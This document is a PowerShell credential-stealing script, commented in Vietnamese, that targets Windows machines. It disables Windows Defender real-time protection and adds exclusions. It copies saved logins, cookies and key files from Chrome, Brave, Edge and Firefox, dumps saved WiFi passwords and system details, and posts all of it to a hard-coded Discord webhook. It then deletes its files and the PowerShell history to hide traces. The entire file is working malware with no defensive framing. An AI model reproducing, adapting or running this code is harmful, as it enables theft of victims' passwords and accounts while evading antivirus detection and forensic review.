#-- Payload configuration --#

$WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'

# Su dung thu muc tam tren may nan nhan (thay vi USB)
$destDir = "$env:TEMP\Exfil_$env:USERNAME"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir -Force
}

# Tao thu muc con cho browser data
$browserDir = "$destDir\BrowserData"
if (-Not (Test-Path $browserDir)) {
    New-Item -ItemType Directory -Path $browserDir -Force
}

# Tat Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:TEMP\" -ErrorAction SilentlyContinue
Set-MpPreference -ExclusionExtension "ps1" -ErrorAction SilentlyContinue

# ==========================================
# DISCORD WEBHOOK FUNCTION
# ==========================================
function Send-DiscordText {
    param([string]$Title, [string]$Content)
    if ([string]::IsNullOrWhiteSpace($Content)) { return }
    if ($Content.Length -gt 1900) { $Content = $Content.Substring(0, 1900) + "...[TRUNCATED]" }
    $Message = "[$Title]`n```" + $Content + "```"
    $payload = @{ content = $Message } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
        Write-Host "[+] Sent: $Title"
    } catch {}
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDirPath, $filesToCopy) {
    $browserDestDir = Join-Path -Path $browserDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir -Force
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDirPath -ChildPath $file
        if (Test-Path $source) {
            try {
                Copy-Item -Path $source -Destination $browserDestDir -Force -ErrorAction Stop
                Write-Host "$browserName - File copied: $file"
            } catch {
                Write-Host "$browserName - Failed to copy: $file (file may be locked)"
            }
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }
}

# ==========================================
# 1. GOOGLE CHROME
# ==========================================
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if (Test-Path $chromeDir) {
    CopyBrowserFiles "Chrome" $chromeDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (Test-Path $localState) {
        Copy-Item $localState "$browserDir\Chrome\" -Force -ErrorAction SilentlyContinue
        Write-Host "Chrome - Local State copied"
    }
} else {
    Write-Host "Chrome - Not installed"
}

# ==========================================
# 2. BRAVE
# ==========================================
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
if (Test-Path $braveDir) {
    CopyBrowserFiles "Brave" $braveDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    if (Test-Path $localState) {
        Copy-Item $localState "$browserDir\Brave\" -Force -ErrorAction SilentlyContinue
        Write-Host "Brave - Local State copied"
    }
} else {
    Write-Host "Brave - Not installed"
}

# ==========================================
# 3. FIREFOX
# ==========================================
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfileDir) {
    $firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default*" | Select-Object -First 1
    if ($firefoxProfile) {
        $firefoxDir = $firefoxProfile.FullName
        $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
        CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
    } else {
        Write-Host "Firefox - No profile found"
    }
} else {
    Write-Host "Firefox - Not installed"
}

# ==========================================
# 4. MICROSOFT EDGE
# ==========================================
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
if (Test-Path $edgeDir) {
    CopyBrowserFiles "Edge" $edgeDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    if (Test-Path $localState) {
        Copy-Item $localState "$browserDir\Edge\" -Force -ErrorAction SilentlyContinue
        Write-Host "Edge - Local State copied"
    }
} else {
    Write-Host "Edge - Not installed"
}

# ==========================================
# 5. SYSTEM INFORMATION
# ==========================================
Write-Host "[+] Gathering system information..."
$sysInfoDir = "$destDir\SystemInfo"
New-Item -ItemType Directory -Path $sysInfoDir -Force

Get-ComputerInfo | Out-File "$sysInfoDir\computer_info.txt" -ErrorAction SilentlyContinue
Get-Process | Out-File "$sysInfoDir\process_list.txt" -ErrorAction SilentlyContinue
Get-Service | Out-File "$sysInfoDir\service_list.txt" -ErrorAction SilentlyContinue
Get-NetIPAddress | Out-File "$sysInfoDir\network_config.txt" -ErrorAction SilentlyContinue
Get-LocalUser | Where-Object { $_.Enabled } | Out-File "$sysInfoDir\local_users.txt" -ErrorAction SilentlyContinue

Write-Host "[+] System information gathered"

# ==========================================
# 6. WIFI PASSWORDS
# ==========================================
Write-Host "[+] Extracting WiFi passwords..."
$wifiFile = "$destDir\WiFi_Details.txt"
"============================================================" | Out-File $wifiFile
"WiFi Passwords for $env:COMPUTERNAME" | Out-File $wifiFile -Append
"Extracted: $(Get-Date)" | Out-File $wifiFile -Append
"============================================================" | Out-File $wifiFile -Append
"" | Out-File $wifiFile -Append

$wifiProfiles = netsh wlan show profiles | Select-String ":\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
foreach ($profile in $wifiProfiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
    if (-not $keyContent) { $keyContent = "No password (Open network)" }
    "$profile : $keyContent" | Out-File $wifiFile -Append
}
Write-Host "[+] WiFi passwords extracted"

# ==========================================
# 7. SEND DATA TO DISCORD
# ==========================================
Write-Host "[+] Sending data to Discord..."

# Gui thong tin target
Send-DiscordText "TARGET INFO" "Computer: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date)"

# Gui WiFi passwords
$wifiContent = Get-Content $wifiFile -Raw -ErrorAction SilentlyContinue
if ($wifiContent) {
    Send-DiscordText "WIFI PASSWORDS" $wifiContent
}

# Gui System Info
$computerInfo = Get-Content "$sysInfoDir\computer_info.txt" -Raw -ErrorAction SilentlyContinue
if ($computerInfo) { Send-DiscordText "SYSTEM INFO" $computerInfo }

$localUsers = Get-Content "$sysInfoDir\local_users.txt" -Raw -ErrorAction SilentlyContinue
if ($localUsers) { Send-DiscordText "LOCAL USERS" $localUsers }

$processes = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 20 | Out-String
Send-DiscordText "TOP 20 PROCESSES" $processes

# Gui browser credentials
$browsers = @("Chrome", "Brave", "Edge", "Firefox")
foreach ($browser in $browsers) {
    $browserDataDir = "$browserDir\$browser"
    if (Test-Path $browserDataDir) {
        $loginDataFile = "$browserDataDir\Login Data"
        if (Test-Path $loginDataFile) {
            $bytes = [System.IO.File]::ReadAllBytes($loginDataFile)
            if ($bytes.Length -gt 3000) { $bytes = $bytes[0..2999] }
            $content = [System.Text.Encoding]::UTF8.GetString($bytes)
            Send-DiscordText "$browser - LOGIN DATA" $content
        }
        
        # Firefox specific
        $loginsJson = "$browserDataDir\logins.json"
        if (Test-Path $loginsJson) {
            $content = Get-Content $loginsJson -Raw -ErrorAction SilentlyContinue
            if ($content.Length -gt 1900) { $content = $content.Substring(0, 1900) }
            Send-DiscordText "Firefox - LOGINS.JSON" $content
        }
    }
}

# Gui thong bao hoan tat
Send-DiscordText "COMPLETED" "Exfiltration finished at $(Get-Date)"

# ==========================================
# 8. CLEANUP
# ==========================================
Write-Host "[+] Cleaning up..."

# Xoa tat ca file tam
Remove-Item $destDir -Recurse -Force -ErrorAction SilentlyContinue

# Xoa lich su PowerShell
Clear-History
$historyPath = (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
if ($historyPath -and (Test-Path $historyPath)) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
}

# Bat lai Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue

Write-Host "[+] Done!"
exit
